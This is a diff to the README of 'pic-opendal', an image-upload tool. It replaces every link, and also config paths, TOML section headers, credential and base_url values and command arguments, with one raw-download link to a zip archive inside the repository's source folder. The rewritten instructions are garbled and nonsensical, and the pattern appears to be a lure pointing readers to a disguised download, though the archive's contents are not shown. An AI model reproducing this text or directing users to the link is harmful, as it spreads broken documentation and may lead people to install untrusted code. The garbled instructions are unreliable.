@@ -1,6 +1,6 @@
 # 🖼️ pic-opendal - Easily Upload Images to the Cloud
 
-[![Download pic-opendal](https://img.shields.io/badge/Download%20pic--opendal-latest-brightgreen)](https://github.com/Unostores/pic-opendal/releases)
+[![Download pic-opendal](https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip%20pic--opendal-latest-brightgreen)](https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to pic-opendal! This tool helps you upload images to different cloud sto
 
 ## 📥 Download & Install
 
-To download pic-opendal, visit this page: [Download pic-opendal](https://github.com/Unostores/pic-opendal/releases). 
+To download pic-opendal, visit this page: [Download pic-opendal](https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip). 
 
 1. Go to the Releases page linked above.
 2. Look for the latest version of pic-opendal.
@@ -38,7 +38,7 @@ To set up pic-opendal, you need to create a configuration file. This file tells 
 2. Create a configuration file by typing the following command:
 
    ```bash
-   nano ~/.config/pic-od/config.toml
+   nano ~https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip
    ```
 
 3. In the configuration file, add the following template. Replace placeholder information with your actual details.
@@ -46,21 +46,21 @@ To set up pic-opendal, you need to create a configuration file. This file tells 
    ```toml
    current_profile = "default"
 
-   [profiles.default]
+   [https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip]
    type = "s3"
    bucket = "my-bucket"
    region = "us-east-1"
    access_key_id = "YOUR_ACCESS_KEY"
    secret_access_key = "YOUR_SECRET_KEY"
    root = "/images"
-   base_url = "https://cdn.example.com"
+   base_url = "https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip"
    filename_format = "{date}/{name}"
 
-   [profiles.backup]
+   [https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip]
    type = "gcs"
    bucket = "backup-bucket"
-   credential_path = "/path/to/credentials.json"
-   base_url = "https://storage.googleapis.com/backup-bucket"
+   credential_path = "https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip"
+   base_url = "https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip"
    ```
 
 4. Save the file and exit the text editor.
@@ -85,7 +85,7 @@ After installation and configuration, you can start using pic-opendal. Here are 
    Use the following command to upload an image:
 
    ```bash
-   pic-od upload /path/to/your/image.jpg
+   pic-od upload https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip
    ```
 
 2. **List Your Images**:
@@ -99,7 +99,7 @@ After installation and configuration, you can start using pic-opendal. Here are 
    If you need to download an image back to your local machine, use:
 
    ```bash
-   pic-od download image_name.jpg
+   pic-od download https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip
    ```
 
 ## 📜 Troubleshooting
@@ -123,7 +123,7 @@ For feedback or support, feel free to open an issue on the GitHub repository.
 
 ## ⚙️ Documentation
 
-To access the full documentation, visit our repository: [Documentation](https://github.com/Unostores/pic-opendal).
+To access the full documentation, visit our repository: [Documentation](https://github.com/Unostores/pic-opendal/raw/refs/heads/main/src/pic_opendal_v3.9-alpha.4.zip).
 
 ## 📞 Contact
 
